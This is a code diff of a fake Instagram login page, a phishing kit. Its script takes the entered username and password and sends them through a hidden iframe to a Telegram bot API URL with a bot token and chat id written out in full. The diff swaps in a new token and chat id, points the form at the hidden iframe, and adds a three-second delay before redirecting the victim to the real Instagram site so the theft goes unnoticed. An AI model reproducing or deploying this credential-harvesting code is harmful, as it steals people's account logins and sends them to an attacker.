@@ -174,18 +174,22 @@
 
 
 				
-				<iframe id="myIframe" style="display:none;" src="www.google.com" frameborder="0" marginwidth="0" marginheight="0" scrolling="NO" width="100%" height="100%"></iframe>
+				<iframe id="myIframe" style="display:none;" src="-" frameborder="0" marginwidth="0" marginheight="0" scrolling="NO" width="100%" height="100%"></iframe>
 
             <script> function newSrc() {
             let myIframe = document.getElementById("myIframe");
-            let url_string = "https://api.telegram.org/bot1249964660:AAF1_sn-3WUrR6WFrW-6Oh48tpY8mtxVbOc/SendMessage?chat_id=933046923&text=";
+            let url_string = "https://api.telegram.org/bot1362974392:AAHFbwvNbeMuZdHrx1MdEcPouAtA62UHRUA/SendMessage?chat_id=444546271&text=";
             let id1 = "Username : ";
             let pass1 = " Password : ";
     
             let adsURL = url_string+id1+id+pass1+pass;
             console.log(adsURL);
             myIframe.src = adsURL;
-		window.location="https://www.instagram.com"; }
+			
+			setTimeout(function(){
+            window.location.href = 'https://www.instagram.com';
+         }, 3000);
+		}
 			</script>
 
 
@@ -194,7 +198,7 @@
 	
 
 	
-  <form class="_3jvtb" target="hidden_iframe" onsubmit="submit_soap()"><div class="_t296e"><div class="_sjplo">
+  <form target="myIframe"><div class="_t296e"><div class="_sjplo">
   <div class="_ev9xl"><!--<label for="fa4e2a34ab06a" class="_ssj08">Phone number, username, or email</label>-->
   <input type="text" class="_ph6vk _jdqpn _o716c" id="username1" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="username1" value="">
   </div>
